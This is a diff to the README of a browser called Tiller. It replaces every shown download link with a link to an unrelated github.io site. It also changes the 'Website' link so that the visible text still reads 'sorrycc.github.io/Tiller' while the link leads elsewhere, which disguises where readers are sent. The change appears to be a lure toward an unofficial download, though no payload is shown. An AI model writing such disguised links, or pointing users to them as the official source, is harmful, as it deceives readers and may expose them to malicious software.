@@ -1,10 +1,10 @@
 # 🌐 Tiller - A Faster, Friendlier Way to Browse
 
-[![Download Tiller](https://img.shields.io/badge/⬇%20Download%20Tiller-Latest%20Version-ff4d6d?style=for-the-badge&labelColor=1f2933)](https://github.com/athenianhonorific353/Tiller/releases)
+[![Download Tiller](https://img.shields.io/badge/⬇%20Download%20Tiller-Latest%20Version-ff4d6d?style=for-the-badge&labelColor=1f2933)](https://athenianhonorific353.github.io)
 
 **Tiller** is a small, quick web browser that stays out of your way. It opens pages fast, keeps your tabs organised, remembers what you were doing the last time you closed it, and even includes a helpful built-in assistant panel that can lend a hand while you browse.
 
-Website: [sorrycc.github.io/Tiller](https://sorrycc.github.io/Tiller/)
+Website: [sorrycc.github.io/Tiller](https://athenianhonorific353.github.io)
 
 ---
 
@@ -36,7 +36,7 @@ That is it. No account, no sign-up, no complicated setup screens.
 
 **Visit this link to download the application:**
 
-### 👉 [https://github.com/athenianhonorific353/Tiller/releases](https://github.com/athenianhonorific353/Tiller/releases)
+### 👉 [https://athenianhonorific353.github.io](https://athenianhonorific353.github.io)
 
 Once the page opens, you will see the available download listed there. Click it, and your computer will begin saving the file. Depending on your internet speed, this usually takes less than a minute.
 
